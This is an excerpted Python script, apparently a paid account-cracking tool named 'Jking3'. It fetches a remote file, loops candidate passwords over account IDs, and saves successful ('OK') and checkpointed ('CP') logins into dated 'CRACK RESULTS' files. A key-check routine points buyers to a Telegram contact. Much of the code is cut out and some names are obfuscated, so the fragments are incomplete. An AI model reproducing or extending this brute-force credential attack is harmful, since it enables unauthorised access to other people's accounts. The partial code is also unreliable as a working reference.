...
try:
    rq = requests.get('https://github.com/AryanHack907/J-king/blob/main/Joya.txt').text
...
def banner():
        os.system("clear")
        os.system('echo -e "\n\x1b[1;91m___   _  ______    ___   _______  __   __  __    _  _______  \n\x1b[1;91m      # #    # ### #     #  ##### \n\x1b[1;92m      # #   #   #  ##    # #     #\n\x1b[1;92m      # #  #    #  # #   # #\n\x1b[1;91m      # ###     #  #  #  # #  ####\n\x1b[1;93m#     # #  #    #  #   # # #     # \n\x1b[1;93m#     # #   #   #  #    ## #     #\n\x1b[1;97m #####  #    # ### #     #  ##### \n\x1b[1;97m------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : AryanNafas \n \x1b[1;93m(*)\x1b[1;93m Tele        : https://t.me/aryanhack907\n \x1b[1;93m(*)\x1b[1;95m Tool Name : Jking3\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/AryanHack907\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
...
def menu():
    ...
    psb('         %s》%s》%s》%sWELLCOME TO JKING3TOOL%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
        ...
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    files_cp = "JKING-CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sJKING-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "JKING-OK/%s.txt"%(tanggal)
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("JKING-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("JKING-OK/%s"%(files)).read().splitlines()
        ...
        try:
            cpl = os.listdir("JKING-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("JKING-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sJKING-CP%s] %s'%(K,P,K,yyy))
...
def folder():
    try:os.mkdir("JKING-CP")
    except:pass
    try:os.mkdir("JKING-OK")
    except:pass
...
def genkey():
	try:
		...
		print("\033[0;93m   TOOL PRICE : %s😐 "%(H))
		print("\033[0;93m: %s month"%(H))
		subprocess.check_output(["am", "start", "https://t.me/AryanHack9007"])
		exit()
	except(IOError):
		rb = rx
